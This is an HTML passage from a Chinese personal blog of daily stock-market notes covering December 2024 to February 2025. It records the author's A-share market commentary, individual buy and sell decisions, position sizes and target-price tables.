title="策略"></a>策略</h4><p>三月前完成布局</p><p>三六零（持有，仓位5%～10%）、利欧股份（减仓，仓位5%）、岩山科技（持有，仓位5%）</p><p>中公教育（止盈&#x2F;损）、浙江东方（止盈&#x2F;损）、通威股份（持有，仓位5%）、南京熊猫（持有，仓位5%）</p><p>润达医疗（持有，仓位5%）、赛力医疗（买入，仓位5%）、国新健康（止盈&#x2F;损）、一鸣食品（止损）</p><p>供销大集（止损）、用友网络（买入，仓位10%）、恒生电子（买入，仓位10%）</p><h3 id="2月17日-周一"><a href="#2月17日-周一" class="headerlink" title="2月17日 周一"></a>2月17日 周一</h3><h4 id="A股-134"><a href="#A股-134" class="headerlink" title="A股"></a>A股</h4><p>大盘明显放量滞涨，危险可能很快来临，注意止盈，寻找走趋势的DS概念龙头。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250217.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月16日-周日"><a href="#2月16日-周日" class="headerlink" title="2月16日 周日"></a>2月16日 周日</h3><h4 id="策略-16"><a href="#策略-16" class="headerlink" title="策略"></a>策略</h4><p>今年上半年的题材主线就是AI应用、算力概念和AI硬件等，近期有回调需求，但趋势不变，整个概念至少还有50%空间。</p><h3 id="2月14日-周五"><a href="#2月14日-周五" class="headerlink" title="2月14日 周五"></a>2月14日 周五</h3><h4 id="A股-135"><a href="#A股-135" class="headerlink" title="A股"></a>A股</h4><p>大盘超预期继续大涨，港股受顶级利好催化继续强势，但已经降下的仓位就不要再追了，等待回调充分再添补。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250214.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-17"><a href="#策略-17" class="headerlink" title="策略"></a>策略</h4><p>买入岩山科技、浙江东方、莲花控股，卖出万丰奥威、贝因美。</p><h3 id="2月13日-周四"><a href="#2月13日-周四" class="headerlink" title="2月13日 周四"></a>2月13日 周四</h3><h4 id="A股-136"><a href="#A股-136" class="headerlink" title="A股"></a>A股</h4><p>高位妖股严重分化，换手率暴增，危险来临，对高位板块短期保持谨慎，长期维持乐观，策略转换为避险寻找抄底机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250213.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-18"><a href="#策略-18" class="headerlink" title="策略"></a>策略</h4><p>卖出拓维信息、恒生电子，买入杭州银行。</p><h3 id="2月12日-周三"><a href="#2月12日-周三" class="headerlink" title="2月12日 周三"></a>2月12日 周三</h3><h4 id="A股-137"><a href="#A股-137" class="headerlink" title="A股"></a>A股</h4><p>春季躁动！超预期强势，下午盘资金抢筹券商、房地产拉升指数，DS概念连续暴涨，行情轮动继续，把握节奏，回调是调仓机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250212.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月11日-周二"><a href="#2月11日-周二" class="headerlink" title="2月11日 周二"></a>2月11日 周二</h3><h4 id="A股-138"><a href="#A股-138" class="headerlink" title="A股"></a>A股</h4><p>DS概念首阴，题材来到危机关口，但题材炒作依然会延续，直到大洋对岸“安内”结束挥起关税大棒，连续回撤的龙头值得布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250211.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月10日-周一"><a href="#2月10日-周一" class="headerlink" title="2月10日 周一"></a>2月10日 周一</h3><h4 id="A股-139"><a href="#A股-139" class="headerlink" title="A股"></a>A股</h4><p>超预期强势，DS概念继续暴拉，机器人龙头回调，大盘即将面临更大抛压，明天上午或是出货机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250210.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-19"><a href="#策略-19" class="headerlink" title="策略"></a>策略</h4><p>买入南京熊猫、国新健康，博弈脑机接口和AI医疗行情。</p><h3 id="2月9日-周日"><a href="#2月9日-周日" class="headerlink" title="2月9日 周日"></a>2月9日 周日</h3><h4 id="策略-20"><a href="#策略-20" class="headerlink" title="策略"></a>策略</h4><p>大盘有回调压力，注意题材风险，继续观察逃顶信号减少仓位，待有效回撤后继续布局热点板块。</p><h3 id="2月8日-周六"><a href="#2月8日-周六" class="headerlink" title="2月8日 周六"></a>2月8日 周六</h3><h4 id="复盘-4"><a href="#复盘-4" class="headerlink" title="复盘"></a>复盘</h4><p>本周DS概念、人形机器人和智能驾驶概念爆发，带领科技股全面上涨，双创三日涨超5%，下周面临回调压力，但科技做多趋势不变，机器人有加速赶顶的趋势，短期内不要介入，人工智能概念全面高举高打，回调至五日线视作买入机会，尤其是大容量票和龙头股可以继续重仓，出现危险信号再止盈出局，坚定做多整波主升浪。</p><h3 id="2月7日-周五"><a href="#2月7日-周五" class="headerlink" title="2月7日 周五"></a>2月7日 周五</h3><h4 id="A股-140"><a href="#A股-140" class="headerlink" title="A股"></a>A股</h4><p>大盘超预期强势，盘中出现分歧但放量站上3300点，下周分化将更加明显，适当止盈和布局补涨板块。</p><h4 id="策略-21"><a href="#策略-21" class="headerlink" title="策略"></a>策略</h4><p>布局AI医疗，买入润达医疗，减少持仓股票支数，增加筹码集中度。</p><h3 id="2月6日-周四"><a href="#2月6日-周四" class="headerlink" title="2月6日 周四"></a>2月6日 周四</h3><h4 id="A股-141"><a href="#A股-141" class="headerlink" title="A股"></a>A股</h4><p>双概念继续强势暴涨，比亚迪涨停，科技股做多情绪浓厚，短期积累了大量盈利盘，注意布局节奏，等待回调的买入机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250206.png" srcset="/img/loading.gif" lazyload></p><h3 id="2月5日-周三"><a href="#2月5日-周三" class="headerlink" title="2月5日 周三"></a>2月5日 周三</h3><h4 id="A股-142"><a href="#A股-142" class="headerlink" title="A股"></a>A股</h4><p>行情割裂十分严重，deepseek概念股和人形机器人受春节利好催化大面积暴涨，华为产业链、国产半导体、国产软件概念集体爆发，而权重和其他板块没什么表现，疯狂之后必是分化，警惕跟风盘的杀跌，适当布局具备性价比的大盘股。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250205.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-22"><a href="#策略-22" class="headerlink" title="策略"></a>策略</h4><p>买入农业银行博弈明日的修复和权重支撑盘面行情。</p><h3 id="2月2日-周日"><a href="#2月2日-周日" class="headerlink" title="2月2日 周日"></a>2月2日 周日</h3><h4 id="策略-23"><a href="#策略-23" class="headerlink" title="策略"></a>策略</h4><p>人形机器人行情可能贯穿2025年始终，但目前已经有一批股票涨至高位，短期做补涨和回调低吸行情。</p><p>新能源以锂矿为代表可能会在二季度迎来基本面反转，可以在一季度末开始适当布局。</p><p>低空经济、AI应用、国产半导体是科技主旋律，但目前累积了大量盈利盘，适合做高抛低吸。</p><h3 id="2月1日-周六"><a href="#2月1日-周六" class="headerlink" title="2月1日 周六"></a>2月1日 周六</h3><h4 id="策略-24"><a href="#策略-24" class="headerlink" title="策略"></a>策略</h4><table><thead><tr><th align="center">股票名</th><th align="center">建仓价格区间</th><th align="center">目标价</th></tr></thead><tbody><tr><td align="center">中国石化</td><td align="center">6.00～6.20</td><td align="center">6.70</td></tr><tr><td align="center">中国海油</td><td align="center">26.00～27.00</td><td align="center">29.00</td></tr><tr><td align="center">紫金矿业</td><td align="center">15.00～16.00</td><td align="center">18.00</td></tr><tr><td align="center">万丰奥威</td><td align="center">16.00～17.00</td><td align="center">20.00</td></tr><tr><td align="center">天茂集团</td><td align="center">3.50～3.80</td><td align="center">4.60</td></tr><tr><td align="center">紫光股份</td><td align="center">24.00～25.00</td><td align="center">29.00</td></tr><tr><td align="center">万科A</td><td align="center">7.00～7.50</td><td align="center">8.00</td></tr><tr><td align="center">金融科技ETF</td><td align="center">1.250～1.300</td><td align="center">1.600</td></tr><tr><td align="center">科创芯片ETF</td><td align="center">1.380～1.400</td><td align="center">1.500</td></tr></tbody></table><h3 id="1月27日-周一"><a href="#1月27日-周一" class="headerlink" title="1月27日 周一"></a>1月27日 周一</h3><h4 id="A股-143"><a href="#A股-143" class="headerlink" title="A股"></a>A股</h4><p>资金取钱过年，W底黄金坑的概率加大，新年快乐！</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250127.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月24日-周五"><a href="#1月24日-周五" class="headerlink" title="1月24日 周五"></a>1月24日 周五</h3><h4 id="A股-144"><a href="#A股-144" class="headerlink" title="A股"></a>A股</h4><p>今天又修复了昨日的资金出逃抛压，站回二十日线，节前红包行情预期拉满，此前预计的黑天鹅带领A股砸出黄金坑的预判或难以成立，国际经济对抗预期偏鸽，等待市场走出放量的确定信号。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250124.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月23日-周四"><a href="#1月23日-周四" class="headerlink" title="1月23日 周四"></a>1月23日 周四</h3><h4 id="A股-145"><a href="#A股-145" class="headerlink" title="A股"></a>A股</h4><p>资金又借利好出货，吃相难看，但养老金险金入市是长期利好，有利于以银行为代表的红利股行情的进一步演绎，未来在双创和中证1000弱势的时候低位的红利股又是很好的防御选项。目前有取钱过年的缩容压力，继续持筹观察即可。</p><h3 id="1月22日-周三"><a href="#1月22日-周三" class="headerlink" title="1月22日 周三"></a>1月22日 周三</h3><h4 id="A股-146"><a href="#A股-146" class="headerlink" title="A股"></a>A股</h4><p>利好利空继续突袭，市场扑朔迷离，目前还没到加减仓节点，继续等待确定性信号出现，年前不要有过高预期。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250122.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月21日-周二"><a href="#1月21日-周二" class="headerlink" title="1月21日 周二"></a>1月21日 周二</h3><h4 id="A股-147"><a href="#A股-147" class="headerlink" title="A股"></a>A股</h4><p>指数高开低走，TRUMP交易落空，大盘走进国际博弈和国内政策空窗期，年关将近，大资金趋于谨慎，指数波动率下降。近期尝试布局机器人、文化传媒、消费等龙头二波行情，港股率先强势爆发，不宜过度看空，继续持筹。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250121.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月20日-周一"><a href="#1月20日-周一" class="headerlink" title="1月20日 周一"></a>1月20日 周一</h3><h4 id="A股-148"><a href="#A股-148" class="headerlink" title="A股"></a>A股</h4><p>指数小幅冲高，但没有明显回落，锂电池带领创业板支撑题材炒作，早盘高开成交量明显放出，下午有所回落但情绪继续活跃，本周全球市场必将抖三抖，在没有确定性落地叠加年前资金面偏紧张的情况下，继续以观察为主，交易情绪龙头走二波的空间。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250120.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月19日-周日"><a href="#1月19日-周日" class="headerlink" title="1月19日 周日"></a>1月19日 周日</h3><h4 id="策略-25"><a href="#策略-25" class="headerlink" title="策略"></a>策略</h4><p>ETF：传媒ETF、金融科技ETF、游戏ETF</p><p>价值股：万科A、实益达、东方精工</p><h3 id="1月17日-周五"><a href="#1月17日-周五" class="headerlink" title="1月17日 周五"></a>1月17日 周五</h3><h4 id="A股-149"><a href="#A股-149" class="headerlink" title="A股"></a>A股</h4><p>缩量小幅反弹，半导体异动拉升，主力资金谨慎观望，下周将剧烈波动，继续布局低位板块。</p><h3 id="1月16日-周四"><a href="#1月16日-周四" class="headerlink" title="1月16日 周四"></a>1月16日 周四</h3><h4 id="A股-150"><a href="#A股-150" class="headerlink" title="A股"></a>A股</h4><p>寒武纪终于出现短期抱团瓦解，压制科创半导体板块，美国CPI利好催动资源股等托举大盘。即将进入年关政策空窗期，寻找确定性机会，不要盲目加仓。</p><h3 id="1月15日-周三"><a href="#1月15日-周三" class="headerlink" title="1月15日 周三"></a>1月15日 周三</h3><h4 id="A股-151"><a href="#A股-151" class="headerlink" title="A股"></a>A股</h4><p>缩量回调，只能利好证伪，但指数下跌空间有限，关注个股财报风险，小盘无业绩股回本止盈。</p><h3 id="1月14日-周二"><a href="#1月14日-周二" class="headerlink" title="1月14日 周二"></a>1月14日 周二</h3><h4 id="A股-152"><a href="#A股-152" class="headerlink" title="A股"></a>A股</h4><p>诡异暴涨，主力资金强势流入，资金抢筹大科技大金融，观察行情持续性，谨防下跌中继诱多。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250114.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月13日-周一"><a href="#1月13日-周一" class="headerlink" title="1月13日 周一"></a>1月13日 周一</h3><h4 id="A股-153"><a href="#A股-153" class="headerlink" title="A股"></a>A股</h4><p>继续缩量，首次跌破万亿成交量，短期内板块继续缩容，谨慎布局，博弈极端情绪下T+0ETF的收割行情。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250113.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月12日-周日"><a href="#1月12日-周日" class="headerlink" title="1月12日 周日"></a>1月12日 周日</h3><h4 id="策略-26"><a href="#策略-26" class="headerlink" title="策略"></a>策略</h4><p>红利：中国海油、中国神华</p><p>低空经济：万丰奥威</p><h3 id="1月10日-周五"><a href="#1月10日-周五" class="headerlink" title="1月10日 周五"></a>1月10日 周五</h3><h4 id="A股-154"><a href="#A股-154" class="headerlink" title="A股"></a>A股</h4><p>卑劣！A股自月初第一波通杀之后横盘几日，开启下一波通杀节奏，市场悲观情绪继续演绎，T+0ETF也被大资金收割，投资效应极差，保持不大跌不加仓的节奏配置。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250110.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月9日-周四"><a href="#1月9日-周四" class="headerlink" title="1月9日 周四"></a>1月9日 周四</h3><h4 id="A股-155"><a href="#A股-155" class="headerlink" title="A股"></a>A股</h4><p>成交量又进一步萎靡，如果继续横盘下周要警惕风险了。证券持续不带领情绪，新半军诚意不足，只有小科技板块有所表现，反情绪指标也继续强势涨停，盘面非常割裂。继续维持出现离场机会止盈，在红利和低位股寻求机会的操作策略，增加短线博弈的灵活性。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250109.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月8日-周三"><a href="#1月8日-周三" class="headerlink" title="1月8日 周三"></a>1月8日 周三</h3><h4 id="A股-156"><a href="#A股-156" class="headerlink" title="A股"></a>A股</h4><p>在一波放量杀跌过后，抄底资金强势入场，上证指数站回五日线，证券消费板块依然弱势，预期空间不足，但仍处在反弹段落当中，目前观察量能指标和T+0ETF的情绪反向指标进行判断，小盘股给出离场机会要果断决策。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250108.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月7日-周二"><a href="#1月7日-周二" class="headerlink" title="1月7日 周二"></a>1月7日 周二</h3><h4 id="A股-157"><a href="#A股-157" class="headerlink" title="A股"></a>A股</h4><p>大盘终于反弹，下午反弹放量，半导体强势大涨，科技板块普涨，目前观察各大指数5日线能否有效拐头，继续关注证券能否带领情绪上攻和汇率能否企稳，目前的形势难以支撑指数走出巨大上行空间，在政策空窗期继续以宽幅震荡思维看待，警惕高位股风险。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250107.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球"><a href="#全球" class="headerlink" title="全球"></a>全球</h4><p>大棒挥向腾讯，港股受到牵制下跌，短期难有大机会出现，同时也会对A股产生压制。美股短期继续安全，但难有继续上攻的空间，继续观察政策变化。黄金依然坚挺，目前保持已有仓位，短期内博弈性价比不高。</p><h3 id="1月6日-周一"><a href="#1月6日-周一" class="headerlink" title="1月6日 周一"></a>1月6日 周一</h3><h4 id="A股-158"><a href="#A股-158" class="headerlink" title="A股"></a>A股</h4><p>大盘走出缩量十字星，没有成交量难以确立变盘信号，去弱留强，关注价值股走势，结合盘中做T。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250106.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月5日-周日"><a href="#1月5日-周日" class="headerlink" title="1月5日 周日"></a>1月5日 周日</h3><h4 id="策略-27"><a href="#策略-27" class="headerlink" title="策略"></a>策略</h4><ul><li>低空经济：万丰奥威、中信海直、宗申动力</li><li>光伏：通威股份、TCL中环</li><li>ETF：科创芯片ETF、金融科技ETF、游戏ETF</li></ul><h3 id="1月3日-周五"><a href="#1月3日-周五" class="headerlink" title="1月3日 周五"></a>1月3日 周五</h3><h4 id="A股-159"><a href="#A股-159" class="headerlink" title="A股"></a>A股</h4><p>全球都在调整，唯独黄金独领风骚，指数继续无抵抗式下跌，急跌必有急速反弹，继续持筹等待反弹。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250103.png" srcset="/img/loading.gif" lazyload></p><h3 id="1月2日-周四"><a href="#1月2日-周四" class="headerlink" title="1月2日 周四"></a>1月2日 周四</h3><h4 id="A股-160"><a href="#A股-160" class="headerlink" title="A股"></a>A股</h4><p>60日线跌破，似乎不只是毛刺破位，在没有显性利空的情况下这样暴跌有挖坑的嫌疑，继续持仓布局超跌价值股。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250102.png" srcset="/img/loading.gif" lazyload></p><h3 id="12月31日-周二"><a href="#12月31日-周二" class="headerlink" title="12月31日 周二"></a>12月31日 周二</h3><h4 id="A股-161"><a href="#A股-161" class="headerlink" title="A股"></a>A股</h4><p>终于变盘向下，国债继续上扬，和之前的推演一致，目前看跌破60日线后开启反弹，也可能超预期强势，调仓换股即可。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1231.png" srcset="/img/loading.gif" lazyload></p><h3 id="12月30日-周一"><a href="#12月30日-周一" class="headerlink" title="12月30日 周一"></a>12月30日 周一</h3><h4 id="A股-162"><a href="#A股-162" class="headerlink" title="A股"></a>A股</h4><p>继续缩量横盘，红利股支撑盘面，小微盘股继续下跌，目前没有制造赚钱效应的主线，继续持仓观察即可。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1230.png" srcset="/img/loading.gif" lazyload></p><h3 id="12月27日-周五"><a href="#12月27日-周五" class="headerlink" title="12月27日 周五"></a>12月27日 周五</h3><h4 id="A股-163"><a href="#A股-163" class="headerlink" title="A股"></a>A股</h4><p>中科曙光突然又被斩仓，原因未明，浪潮信息承接力度强于前者，科技股行情还会继续演绎，关注低估值赛道布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1227.png" srcset="/img/loading.gif" lazyload></p><h3 id="12月26日-周四"><a href="#12月26日-周四" class="headerlink" title="12月26日 周四"></a>12月26日 周四</h3><h4 id="A股-164"><a href="#A股-164" class="headerlink" title="A股"></a>A股</h4><p>算力继续走主升浪，还未看到情绪退潮，继续持有等待加速。今日北向资金没有来，风格开始出现切换，权重补跌小盘修复，继续重仓观察即可，在年关到来之前大盘风险不大，继续在双创补涨题材和消费题材寻求机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1226.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-28"><a href="#策略-28" class="headerlink" title="策略"></a>策略</h4><p>春季行情受到广泛讨论，近期应逐渐减少小票仓位，下一波行情的演绎可能是直接放量上攻，也可能是在磨市场热情中酝酿，目前认为在下一轮上涨之前还会有一段破位挖坑的动作，不要被洗出场即可。</p><h3 id="12月25日-周三"><a href="#12月25日-周三" class="headerlink" title="12月25日 周三"></a>12月25日 周三</h3><h4 id="A股-165"><a href="#A股-165" class="headerlink" title="A股"></a>A股</h4><p>机构业绩票继续拉升，涨大跌小继续演绎，中证1000已接近重要支撑，行情一触即发。目前震荡市场继续保持高抛低吸的操作即可，小盘被套住暂时不动等待修复，明年春季继续以布局新能源、AI应用和红利股为主。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1225.png" srcset="/img/loading.gif" lazyload></p><h3 id="12月24日-周二"><a href="#12月24日-周二" class="headerlink" title="12月24日 周二"></a>12月24日 周二</h3><h4 id="A股-166"><a href="#A股-166" class="headerlink" title="A股"></a>A股</h4><p>宇宙行再创历史新高，明年在打压国债的预期下，红利板块炒作可能会延续，小微盘股在国九条的压制下继续下跌，希望能快速企稳。大盘超预期强势，继续跟随科技股炒作，出现加速冲顶迹象后可以及时止盈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1224.png" srcset="/img/loading.gif" lazyload></p><h3 id="12月23日-周一"><a href="#12月23日-周一" class="headerlink" title="12月23日 周一"></a>12月23日 周一</h3><h4 id="A股-167"><a href="#A股-167" class="headerlink" title="A股"></a>A股</h4><p>下跌如期而至，小微盘股全线暴跌，下一波炒作风格还未确立，持筹观察。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1223.png" srcset="/img/loading.gif" lazyload></p><h3 id="12月20日-周五"><a href="#12月20日-周五" class="headerlink" title="12月20日 周五"></a>12月20日 周五</h3><h4 id="A股-168"><a href="#A股-168" class="headerlink" title="A股"></a>A股</h4><p>半导体大幅反弹，超预期强势，但目前不是追涨区间，预计下周还有一个回调段落后开启跨年行情。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1220.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-1"><a href="#全球-1" class="headerlink" title="全球"></a>全球</h4><p>美股持续弱势，鬼故事接踵而至，但个人认为美股没到崩盘之时，下周还会迎来修复，可以在周初适当博弈。</p><h3 id="12月19日-周四"><a href="#12月19日-周四" class="headerlink" title="12月19日 周四"></a>12月19日 周四</h3><h4 id="A股-169"><a href="#A股-169" class="headerlink" title="A股"></a>A股</h4><p>顶住外围压力，国产AI半导体概念带领上攻，大盘继续补跌，成交量变化不大，算力龙头站上趋势线，可能酝酿新一波主升浪行情，继续持筹不动即可，新能源继续弱势，依然在中期布局区间，止盈操作之后可以适度关注。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1219.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-2"><a href="#全球-2" class="headerlink" title="全球"></a>全球</h4><p>美联储释放鹰派讯号，美股和黄金暴跌，美元指数大涨，目前还无法确定是利空催化回调还是美股借势回调，如果能继续有效回调则美股也会出现博弈的机会，继续观察。</p><h4 id="策略-29"><a href="#策略-29" class="headerlink" title="策略"></a>策略</h4><p>主升浪走完的票趁早做止盈动作并调仓到低价板块，短期方向还未确认继续保持仓位不动。</p><h3 id="12月18日-周三"><a href="#12月18日-周三" class="headerlink" title="12月18日 周三"></a>12月18日 周三</h3><h4 id="A股-170"><a href="#A股-170" class="headerlink" title="A股"></a>A股</h4><p>缩量反弹，科50受半导体制裁解除利好推动做了一波上攻，观察是否能有效放量站上趋势线。大盘缩量反弹弱势修复，同时在午盘冲高之后有所回落，目前认为指数还没有跌完，继续观察情绪退潮和风格切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1218.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-30"><a href="#策略-30" class="headerlink" title="策略"></a>策略</h4><p>静观其变</p><h3 id="12月17日-周二"><a href="#12月17日-周二" class="headerlink" title="12月17日 周二"></a>12月17日 周二</h3><h4 id="A股-171"><a href="#A股-171" class="headerlink" title="A股"></a>A股</h4><p>继续下杀，主力杀猪过年，冰雪经济和谷子经济暴跌退潮，小盘股全线崩盘，题材龙头和大权重继续表演，债市小幅下跌，不知是风格开始切换还是护盘资金强撑盘面，目前继续保持谨慎，寻找低位板块布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1217.png" srcset="/img/loading.gif" lazyload></p><h4 id="策略-31"><a href="#策略-31" class="headerlink" title="策略"></a>策略</h4><p>被套的小盘股继续持有观察跨年妖股行情，解套尽早出局即可，目前的题材依然以消费为主，注意新半军的板块结构入场。</p><h3 id="12月16日-周一"><a href="#12月16日-周一" class="headerlink" title="12月16日 周一"></a>12月16日 周一</h3><h4 id="A股-172"><a href="#A股-172" class="headerlink" title="A股"></a>A股</h4><p>指数如期继续杀跌，调整肯定还未结束，今天银行电力电信石油继续强撑盘面，但双创和题材线大幅杀跌，冰雪经济和首发经济继续活跃，但退潮期也就在不远处，目前降低仓位保住本金，后续下跌到位后再布局超跌板块和科技题材即可。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1216.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-3"><a href="#全球-3" class="headerlink" title="全球"></a>全球</h4><p>黄金连续涨一周之后又小幅调整，美股继续高位震荡，AI半导体继续带领美科技股腾飞，华尔街圣诞行情仍会持续。</p><h3 id="12月13日-周五"><a href="#12月13日-周五" class="headerlink" title="12月13日 周五"></a>12月13日 周五</h3><p>交易坚持知行合一真的很难。。。</p><h3 id="12月12日-周四"><a href="#12月12日-周四" class="headerlink" title="12月12日 周四"></a>12月12日 周四</h3><h4 id="A股-173"><a href="#A股-173" class="headerlink" title="A股"></a>A股</h4><p>经济会议利好即将兑现，资金打提前量布局消费，是否是新行情的开始要等待指数突破3500-3600重压区以待确认。跨年妖股行情即将启动，短期可以继续寻找低价人气股进行适量参与，有些许利润就可以止盈。对于一些没有缩量的题材板块，以后的策略要转向低位适当布局而不是一直持有，这样会影响追踪市场主线的动能。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1212.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-4"><a href="#全球-4" class="headerlink" title="全球"></a>全球</h4><p>纳斯达克站上20000点，短期的利润博弈空间进一步收缩，则短期继续在A股寻找机会即可。</p><h4 id="策略-32"><a href="#策略-32" class="headerlink" title="策略"></a>策略</h4><p>机构票出现异动，跨年行情或启动，但对于有利润且不属于市场主线的板块要及时止盈。</p><h3 id="12月11日-周三"><a href="#12月11日-周三" class="headerlink" title="12月11日 周三"></a>12月11日 周三</h3><h4 id="A股-174"><a href="#A股-174" class="headerlink" title="A股"></a>A股</h4><p>今天并没有预期的大幅下杀，但情绪修复也并没有在大盘股中出现，可见大资金的态度依旧没有改变，短期内经济会议的利好还没有落地，中旬还有一定的上行空间，观察新能源、半导体和券商板块能否走出市场主线，如果持续弱势要考虑规避中下旬的情绪杀。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1211.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-5"><a href="#全球-5" class="headerlink" title="全球"></a>全球</h4><p>黄金持续上攻，美国CPI数据和新的议息决议即将落地，全球市场走势十分平稳，静待跨年新变化的出现。</p><h4 id="策略-33"><a href="#策略-33" class="headerlink" title="策略"></a>策略</h4><p>机构重仓股最近迟迟不表现，游资继续在低价股炒小炒差，在流动性充沛但没有基本面支撑的市场中，也许博弈妖股的短期利润是不错的选择，同时观察价值股的走势做低吸操作。</p><h3 id="12月10日-周二"><a href="#12月10日-周二" class="headerlink" title="12月10日 周二"></a>12月10日 周二</h3><h4 id="A股-175"><a href="#A股-175" class="headerlink" title="A股"></a>A股</h4><p>消息落地又变成利空了，大盘高位开盘一路回落，甚至没有收复昨日的跌幅，尤其是今天又一批增量资金被套牢，短期内难有很大的行情出现了，目前就观察经济会议的发力政策是否能带动大盘再向上冲高，短期冲高可以继续止盈之后再做低吸了。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1210.png" srcset="/img/loading.gif" lazyload></p><h4 id="全球-6"><a href="#全球-6" class="headerlink" title="全球"></a>全球</h4><p>NVDA受到龙国调查带领纳斯达克下跌，但只是再次创新高的蓄势，如果能有一波不错的跌幅叠加A股中下旬持续弱势可以考虑美股科技七巨头的圣诞行情的布局。</p><h4 id="策略-34"><a href="#策略-34" class="headerlink" title="策略"></a>策略</h4><p>近日进攻型板块新半军都没有登台表演，只有龙头股强行支撑，尤其是光伏一路下跌，目前在持续震荡的格局下继续做好高位止盈和寻找低位价值股的操作即可，不宜在某个板块恋战太久，在没有确立主线的情况下也不宜在某个板块布局大量仓位。</p><h3 id="12月9日-周一"><a href="#12月9日-周一" class="headerlink" title="12月9日 周一"></a>12月9日 周一</h3><h4 id="A股-176"><a href="#A股-176" class="headerlink" 